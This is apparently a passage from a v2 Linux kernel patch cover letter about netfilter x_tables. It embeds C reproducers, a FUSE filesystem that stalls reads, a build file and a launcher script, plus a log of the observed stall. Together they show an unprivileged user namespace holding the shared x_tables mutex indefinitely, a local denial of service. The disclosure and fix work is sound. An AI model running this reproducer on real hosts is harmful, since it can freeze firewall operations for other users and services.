+		"holder[%d]: calling ARPT_SO_GET_ENTRIES with %u-byte table and a missing output page\n",
+		getpid(), table_size);
+	fflush(stderr);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
+		fprintf(stderr,
+			"holder[%d]: GET_ENTRIES unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void block_on_xt_mutex(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	fprintf(stderr,
+		"waiter[%d]: calling ARPT_SO_GET_INFO and should block on xt[NFPROTO_ARP].mutex\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
+		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static pid_t spawn_child(void (*fn)(unsigned int), unsigned int arg)
+{
+	pid_t pid = fork();
+
+	if (pid < 0)
+		die("fork");
+	if (pid == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		fn(arg);
+		_exit(EXIT_FAILURE);
+	}
+	return pid;
+}
+
+static pid_t spawn_waiter_child(void)
+{
+	pid_t pid = fork();
+
+	if (pid < 0)
+		die("fork");
+	if (pid == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		block_on_xt_mutex();
+		_exit(EXIT_FAILURE);
+	}
+	return pid;
+}
+
+static void dump_proc_state(pid_t pid, const char *tag)
+{
+	char path[64];
+	char buf[256];
+	int fd;
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
+	fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return;
+	n = read(fd, buf, sizeof(buf) - 1);
+	close(fd);
+	if (n <= 0)
+		return;
+	buf[n] = '\0';
+	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
+}
+
+int main(void)
+{
+	unsigned int table_size;
+	pid_t holder;
+	pid_t waiter;
+	unsigned int i;
+
+	if (geteuid() != 0) {
+		fprintf(stderr, "run as root for the userfaultfd-based trigger path\n");
+		return EXIT_FAILURE;
+	}
+
+	table_size = fetch_table_size();
+	fprintf(stderr, "parent[%d]: table \"%s\" size=%u bytes\n",
+		getpid(), table_name, table_size);
+
+	holder = spawn_child(hang_in_get_entries, table_size);
+	sleep(1);
+	waiter = spawn_waiter_child();
+
+	fprintf(stderr,
+		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
+		getpid(), holder, waiter);
+	fflush(stderr);
+
+	for (i = 0; i < 30; i++) {
+		dump_proc_state(holder, "holder");
+		dump_proc_state(waiter, "waiter");
+		sleep(1);
+	}
+
+	fprintf(stderr, "parent[%d]: holder/waiter still stalled; mutex hold is the bug\n", getpid());
+	kill(holder, SIGKILL);
+	kill(waiter, SIGKILL);
+	waitpid(holder, NULL, 0);
+	waitpid(waiter, NULL, 0);
+	return EXIT_FAILURE;
+}
+------END poc.c------
+
+------BEGIN poc_userns_trigger.c------
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netfilter_arp/arp_tables.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sched.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef SOL_IP
+#define SOL_IP 0
+#endif
+
+static const char *table_name = "filter";
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static int make_ipv4_sock(void)
+{
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die("socket(AF_INET, SOCK_DGRAM)");
+	return fd;
+}
+
+static unsigned int fetch_table_size(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
+		die("getsockopt(ARPT_SO_GET_INFO)");
+
+	close(fd);
+	return info.size;
+}
+
+static void hang_in_get_entries(unsigned int table_size, const char *path)
+{
+	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+	size_t map_len = page_size * 2;
+	char *mapping;
+	struct arpt_get_entries *get;
+	int backing_fd;
+	int sock;
+	socklen_t len;
+
+	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
+		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (mapping == MAP_FAILED)
+		die("mmap anonymous");
+
+	backing_fd = open(path, O_RDWR | O_CLOEXEC);
+	if (backing_fd < 0)
+		die("open fuse file");
+
+	if (mmap(mapping + page_size, page_size, PROT_READ | PROT_WRITE,
+		 MAP_PRIVATE | MAP_FIXED, backing_fd, 0) == MAP_FAILED)
+		die("mmap fuse page");
+	close(backing_fd);
+
+	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
+	memset(get, 0, sizeof(*get));
+	strncpy(get->name, table_name, sizeof(get->name) - 1);
+	get->size = table_size;
+
+	sock = make_ipv4_sock();
+	len = sizeof(*get) + table_size;
+
+	fprintf(stderr,
+		"holder[%d]: namespace GET_ENTRIES using FUSE-backed output page\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
+		fprintf(stderr, "holder[%d]: GET_ENTRIES unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void block_on_xt_mutex(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int sock = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	fprintf(stderr,
+		"waiter[%d]: namespace GET_INFO expected to block on xt mutex\n",
+		getpid());
+	fflush(stderr);
+
+	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
+		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
+			getpid());
+		exit(EXIT_FAILURE);
+	}
+
+	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
+		getpid(), errno, strerror(errno));
+	exit(EXIT_FAILURE);
+}
+
+static void dump_netns(pid_t pid, const char *tag)
+{
+	char path[64];
+	char link[128];
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/ns/net", pid);
+	n = readlink(path, link, sizeof(link) - 1);
+	if (n <= 0)
+		return;
+	link[n] = '\0';
+	fprintf(stderr, "%s[%d]: netns=%s\n", tag, pid, link);
+}
+
+static void dump_wchan(pid_t pid, const char *tag)
+{
+	char path[64];
+	char buf[256];
+	int fd;
+	ssize_t n;
+
+	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
+	fd = open(path, O_RDONLY | O_CLOEXEC);
+	if (fd < 0)
+		return;
+	n = read(fd, buf, sizeof(buf) - 1);
+	close(fd);
+	if (n <= 0)
+		return;
+	buf[n] = '\0';
+	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned int table_size;
+	pid_t holder;
+	pid_t waiter;
+	unsigned int i;
+
+	if (argc != 2) {
+		fprintf(stderr, "usage: %s <fuse-file-path>\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	if (geteuid() != 0) {
+		fprintf(stderr,
+			"run under unshare -Urn so the process has namespace-local CAP_NET_ADMIN\n");
+		return EXIT_FAILURE;
+	}
+
+	table_size = fetch_table_size();
+	dump_netns(getpid(), "parent");
+	fprintf(stderr, "parent[%d]: namespace table size=%u bytes\n",
+		getpid(), table_size);
+
+	holder = fork();
+	if (holder < 0)
+		die("fork");
+	if (holder == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		if (unshare(CLONE_NEWNET) < 0)
+			die("unshare(CLONE_NEWNET)");
+		table_size = fetch_table_size();
+		fprintf(stderr,
+			"holder[%d]: entered a separate network namespace\n",
+			getpid());
+		hang_in_get_entries(table_size, argv[1]);
+	}
+
+	sleep(1);
+
+	waiter = fork();
+	if (waiter < 0)
+		die("fork");
+	if (waiter == 0) {
+		prctl(PR_SET_PDEATHSIG, SIGKILL);
+		dump_netns(getpid(), "waiter");
+		block_on_xt_mutex();
+	}
+
+	fprintf(stderr,
+		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
+		getpid(), holder, waiter);
+	fflush(stderr);
+
+	for (i = 0; i < 30; i++) {
+		dump_netns(holder, "holder");
+		dump_netns(waiter, "waiter");
+		dump_wchan(holder, "holder");
+		dump_wchan(waiter, "waiter");
+		sleep(1);
+	}
+
+	kill(holder, SIGKILL);
+	kill(waiter, SIGKILL);
+	waitpid(holder, NULL, 0);
+	waitpid(waiter, NULL, 0);
+	return EXIT_FAILURE;
+}
+------END poc_userns_trigger.c------
+
+------BEGIN fuse_stall.c------
+#define FUSE_USE_VERSION 31
+
+#include <errno.h>
+#include <fuse3/fuse.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+static const char *file_name = "stall.bin";
+static const size_t file_size = 4096;
+
+static int stall_getattr(const char *path, struct stat *st,
+			 struct fuse_file_info *fi)
+{
+	(void)fi;
+	memset(st, 0, sizeof(*st));
+
+	if (strcmp(path, "/") == 0) {
+		st->st_mode = S_IFDIR | 0755;
+		st->st_nlink = 2;
+		return 0;
+	}
+
+	if (strcmp(path, "/stall.bin") == 0) {
+		st->st_mode = S_IFREG | 0666;
+		st->st_nlink = 1;
+		st->st_size = file_size;
+		return 0;
+	}
+
+	return -ENOENT;
+}
+
+static int stall_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+			 off_t off, struct fuse_file_info *fi,
+			 enum fuse_readdir_flags flags)
+{
+	(void)off;
+	(void)fi;
+	(void)flags;
+
+	if (strcmp(path, "/") != 0)
+		return -ENOENT;
+
+	filler(buf, ".", NULL, 0, 0);
+	filler(buf, "..", NULL, 0, 0);
+	filler(buf, file_name, NULL, 0, 0);
+	return 0;
+}
+
+static int stall_open(const char *path, struct fuse_file_info *fi)
+{
+	(void)fi;
+
+	if (strcmp(path, "/stall.bin") != 0)
+		return -ENOENT;
+	return 0;
+}
+
+static int stall_read(const char *path, char *buf, size_t size, off_t off,
+		      struct fuse_file_info *fi)
+{
+	(void)buf;
+	(void)size;
+	(void)off;
+	(void)fi;
+
+	if (strcmp(path, "/stall.bin") != 0)
+		return -ENOENT;
+
+	fprintf(stderr,
+		"fuse[%d]: read request for stall.bin received; stalling indefinitely\n",
+		getpid());
+	fflush(stderr);
+
+	for (;;)
+		pause();
+}
+
+static const struct fuse_operations stall_ops = {
+	.getattr = stall_getattr,
+	.readdir = stall_readdir,
+	.open = stall_open,
+	.read = stall_read,
+};
+
+int main(int argc, char **argv)
+{
+	if (argc != 2) {
+		fprintf(stderr, "usage: %s <mountpoint>\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	return fuse_main(argc, argv, &stall_ops, NULL);
+}
+------END fuse_stall.c------
+
+------BEGIN Makefile------
+CC ?= gcc
+CFLAGS ?= -O2 -Wall -Wextra
+PKG_CONFIG ?= pkg-config
+
+FUSE_AVAILABLE := $(shell $(PKG_CONFIG) --exists fuse3 && echo 1 || echo 0)
+FUSE_CFLAGS := $(shell $(PKG_CONFIG) --cflags fuse3 2>/dev/null)
+FUSE_LIBS := $(shell $(PKG_CONFIG) --libs fuse3 2>/dev/null)
+
+ifeq ($(FUSE_AVAILABLE),1)
+ALL_TARGETS := poc poc-userns-trig fuse_stall
+else
+ALL_TARGETS := poc poc-userns-trig
+endif
+
+.PHONY: all clean
+
+all: $(ALL_TARGETS)
+
+poc: poc.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+poc-userns-trig: poc_userns_trigger.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+fuse_stall: fuse_stall.c
+ifeq ($(FUSE_AVAILABLE),1)
+	$(CC) $(CFLAGS) $(FUSE_CFLAGS) -o $@ $< $(FUSE_LIBS)
+else
+	@echo "fuse3 headers not found; install libfuse3-dev in the guest to build fuse_stall" >&2
+	@exit 1
+endif
+
+clean:
+	rm -f poc poc-userns-trig fuse_stall
+------END Makefile------
+
+------BEGIN poc.sh------
+#!/bin/sh
+set -eu
+
+mnt="${1:-$HOME/fusemnt}"
+fuse_bin="${FUSE_BIN:-./fuse_stall}"
+trigger_bin="${TRIGGER_BIN:-./poc-userns-trig}"
+log_file="${FUSE_LOG:-$HOME/fuse_stall.log}"
+
+fusermount3 -u -q "$mnt" 2>/dev/null || true
+rm -rf "$mnt"
+mkdir -p "$mnt"
+
+"$fuse_bin" "$mnt" >"$log_file" 2>&1 &
+for _ in $(seq 1 50); do
+	if [ -e "$mnt/stall.bin" ]; then
+		exec unshare -Urn "$trigger_bin" "$mnt/stall.bin"
+	fi
+	sleep 0.2
+done
+
+echo "timed out waiting for $mnt/stall.bin" >&2
+exit 1
+------END poc.sh------
+
+Unpatched FUSE/user-namespace observation. The holder is in a FUSE page
+fault; the waiter is blocked on the xt mutex.
+
+----BEGIN crash log----
+parent[540]: netns=net:[4026532177]
+parent[540]: namespace table size=952 bytes
+holder[550]: entered a separate network namespace
+holder[550]: namespace GET_ENTRIES using FUSE-backed output page
+parent[540]: holder=550 waiter=551; dumping wchan while waiter should block
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: netns=net:[4026532177]
+waiter[551]: wchan=0
+waiter[551]: namespace GET_INFO expected to block on xt mutex
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+holder[550]: netns=net:[4026532247]
+waiter[551]: netns=net:[4026532177]
+holder[550]: wchan=folio_wait_bit_common
+waiter[551]: wchan=xt_find_table_lock
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+---
+changes in v2:
+  - Rebase onto current nf.git after 0bd7ed1a3263c ("netfilter:
+    arp_tables: remove the 32bit compat interface"). ARP GET_INFO
+    and GET_ENTRIES are updated on the native paths only. IPv4 and
+    IPv6 still include the compat GET_ENTRIES retry.
+  - Drop hung_task_panic and the 10-second hung_task timeout from the
+    reproducer, as pointed out by Pablo Neira Ayuso. Observe the stall
+    through holder/waiter wchan instead.
+  - v1 Link: https://lore.kernel.org/all/cover.1788244146.git.zihanx@nebusec.ai/
+
+Zihan Xi (1):
+  netfilter: x_tables: avoid holding mutex over faultable user copies
+
+ net/ipv4/netfilter/arp_tables.c | 22 +++++++++++++++++-----
+ net/ipv4/netfilter/ip_tables.c  | 33 ++++++++++++++++++++++++++++-----
+ net/ipv6/netfilter/ip6_tables.c | 33 ++++++++++++++++++++++++++++-----
+ 3 files changed, 73 insertions(+), 15 deletions(-)
+
+-- 
+2.43.0
